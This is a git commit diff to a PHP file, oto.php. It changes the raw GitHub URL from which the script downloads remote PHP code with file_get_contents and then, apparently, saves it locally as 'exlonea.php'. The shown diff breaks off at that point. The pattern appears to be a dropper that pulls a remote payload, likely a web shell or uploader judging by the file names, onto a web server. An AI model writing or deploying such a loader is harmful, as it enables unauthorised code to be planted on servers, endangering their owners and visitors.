7062b37d3af5eb52a6320cd3a382b95283f0a1e9
k36t61 <k36t61@gmail.com>
2025-07-14 16:40:09 +0300

    Update oto.php

--- oto.php
+++ oto.php
@@ -1,5 +1,5 @@
 <?php
- $url = "https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/7.2.php";
+ $url = "https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/exup72.php";
     $fileContent = file_get_contents($url);
     if ($fileContent !== false) {
         $fileName = "exlonea.php";
